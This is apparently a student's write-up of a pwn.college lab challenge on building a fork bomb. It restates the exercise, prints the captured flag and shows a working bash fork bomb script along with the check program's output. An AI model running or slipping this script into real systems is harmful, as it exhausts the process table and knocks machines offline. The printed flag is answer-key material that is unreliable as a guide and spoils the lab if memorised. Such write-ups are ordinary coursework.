# Daring Destruction

## Fork Bomb
If you create processes faster than the kernel can handle, the process table fills up and everything grinds to a halt. This new process (e.g., of an ls invocation) is ``forked'' off of a parent process (e.g., a shell instance). Thus, the induced explosion of processes is called a "Fork Bomb".

### Objective
You have the tools to do this:

write a small script (like in the Chaining Commands module)
make it executable (like in the Perceiving Permissions module)
make it launch a copy of itself in the background (like in the Processes and Jobs module)
and then launch another copy of itself in the background!
Each copy will launch two more, and each of those will launch two more, and you will flood the system with so many processes that new ones will not be able to start!

This challenge contains a /challenge/check that'll try to determine if your fork bomb is working (e.g., if it can't launch new processes) and give you the flag if so. 

### Solve
**Flag:** `pwn.college{gCWVVS-YvG6dxui5K91g-7yr-k5.QXxITM3EDLygjN0czW}`

- I launched the `/challenge/check` command in the terminal. Then opened another terminal and there I made a script 'x' and lauched it. After the system was overwhelmed, I got the flag.

```
hacker@destruction~the-fork-bomb:~$ /challenge/check
It looks like the system can still spawn processes. We'll check again in 5 seconds...
You successfully saturated the process table.  Here is your hard-earned flag:
pwn.college{gCWVVS-YvG6dxui5K91g-7yr-k5.QXxITM3EDLygjN0czW}
hacker@destruction~the-fork-bomb:~$ cat x
#!/bin/bash

:(){
  : | : &
  };

:
hacker@destruction~the-fork-bomb:~$
```

### New Learnings
1. We can easily overwhelm the system by creating more processes than what the kernel can handle. Fork Bomb is one of the ways we can do that.

### References
1. [Fork Bomb](https://www.youtube.com/watch?v=RhtjGp7oMvE)
